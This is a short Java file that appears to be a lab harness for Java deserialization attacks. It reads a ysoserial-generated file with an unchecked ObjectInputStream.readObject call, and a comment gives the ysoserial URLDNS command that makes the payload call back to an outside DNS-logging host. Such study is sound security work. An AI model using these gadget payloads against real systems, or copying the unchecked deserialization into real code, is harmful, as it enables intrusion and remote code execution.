package com.URLDNS;

import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class URLDNS {
    public static void main(String[] args) throws Exception {
//        java -jar ysoserial.jar URLDNS http://z459n.dns10g.com > url.ser
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("./src/main/java/com/URLDNS/url.ser"));
        ois.readObject();
    }
}
